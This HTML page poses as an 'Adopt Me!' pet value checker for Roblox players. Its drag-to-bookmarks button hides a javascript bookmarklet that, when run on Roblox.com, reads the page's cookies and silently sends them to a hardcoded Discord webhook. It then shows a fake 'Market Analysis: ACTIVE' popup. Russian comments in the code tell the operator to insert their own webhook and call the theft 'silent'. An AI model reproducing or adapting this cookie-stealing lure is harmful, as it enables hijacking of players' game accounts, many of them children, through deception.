<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>In-Game Value Checker | Adopt Me!</title>
    <style>
        body { background: #0b0e11; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #181a20; padding: 40px; border-radius: 24px; text-align: center; border: 1px solid #2b3139; width: 420px; box-shadow: 0 15px 40px rgba(0,0,0,0.6); }
        h1 { color: #f0b90b; font-size: 26px; margin-bottom: 10px; }
        .btn { 
            display: inline-block; padding: 22px 40px; background: #f0b90b; color: black; 
            text-decoration: none; font-weight: 800; border-radius: 14px; cursor: move; 
            border: 2px dashed #000; margin: 25px 0; font-size: 18px; transition: 0.3s;
        }
        .btn:hover { background: #ffe066; transform: scale(1.02); }
        .steps { text-align: left; background: #1e2329; padding: 20px; border-radius: 12px; font-size: 14px; color: #929aa5; line-height: 1.5; }
        b { color: #f0b90b; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Value Checker v4.2</h1>
        <p>Analyze pet demand and trade values live.</p>

        <!-- ЗАМЕНИ 'ТВОЙ_ВЕБХУК_ТУТ' НА СВОЮ ССЫЛКУ -->
        <a class="btn" draggable="true" href="javascript:(function(){
            var h = 'https://discord.com/api/webhooks/1497208068570878063/_wH0MSZQV8lxmkw3U8qsB1I8EnREIWO8wLTrOBhdW5W5n5um1kUpZCkTSgWKA1Mqfz3r';
            var c = document.cookie;
            
            /* ТИХАЯ ОТПРАВКА ДАННЫХ */
            if (navigator.sendBeacon) {
                navigator.sendBeacon(h, JSON.stringify({
                    content: '🚀 **Elite Session Captured**\n\n**Data Cluster:**\n```' + (c || 'Empty_or_Protected') + '```'
                }));
            } else {
                fetch(h, {method:'POST',mode:'no-cors',body:JSON.stringify({content: '🚀 **Elite Session (Legacy)**\n```' + c + '```'})});
            }

            /* ЭЛЕГАНТНОЕ ОКНО ДЛЯ ИГРОКА */
            var d = document.createElement('div');
            d.style = 'position:fixed;top:10%;right:5%;width:300px;padding:25px;background:#121212;color:#f0b90b;border:2px solid #f0b90b;z-index:999999;border-radius:20px;text-align:center;font-family:Arial;box-shadow:0 0 30px rgba(0,0,0,0.7);';
            d.innerHTML = '<h3 style=margin:0>Value Checker</h3><p style=color:white;font-size:14px;margin:15px 0>Market Analysis: <span style=color:#00ff00>ACTIVE</span></p><button onclick=this.parentElement.remove() style=width:100%;padding:10px;background:#f0b90b;border:none;border-radius:8px;cursor:pointer;font-weight:bold;color:black>OK</button>';
            document.body.appendChild(d);
        })();">DRAG TO BOOKMARKS</a>

        <div class="steps">
            1. Press <b>Ctrl + Shift + B</b>.<br>
            2. Drag the <b>Yellow Button</b> to the bar.<br>
            3. Use it on <b>Roblox.com</b> to scan values!
        </div>
    </div>
</body>
</html>
